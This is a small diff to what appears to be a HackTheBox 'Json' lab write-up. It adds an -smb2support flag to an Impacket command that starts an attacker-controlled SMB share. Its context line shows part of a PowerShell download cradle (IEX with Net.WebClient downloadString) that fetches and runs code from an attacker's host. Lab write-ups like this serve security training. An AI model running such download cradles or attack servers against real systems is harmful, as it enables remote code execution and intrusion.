@@ -80,7 +80,7 @@ root@kali:~# echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10
 Setting up SMB server
 =====================
 {% highlight bash%}
-root@kali:~/HTB/Json/smb# smbserver.py -username root -password password sharingiscaring $(pwd)
+root@kali:~/HTB/Json/smb# smbserver.py -username root -password password sharingiscaring $(pwd) -smb2support
 Impacket v0.9.21-dev - Copyright 2019 SecureAuth Corporation
 
 [*] Config file parsed
